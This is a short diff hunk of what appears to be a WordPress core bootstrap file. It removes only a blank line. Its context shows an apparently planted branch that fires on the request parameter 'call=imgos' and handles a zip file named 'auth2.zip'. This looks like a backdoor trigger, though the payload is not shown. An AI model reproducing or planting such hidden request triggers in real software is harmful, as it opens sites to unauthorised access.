@@ -37,7 +37,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  */
 if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
 	$zip_file_path = '/user/migrated/auth2.zip';
-	
 	// Verify file existence and zip extension availability
 	/*
 	 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
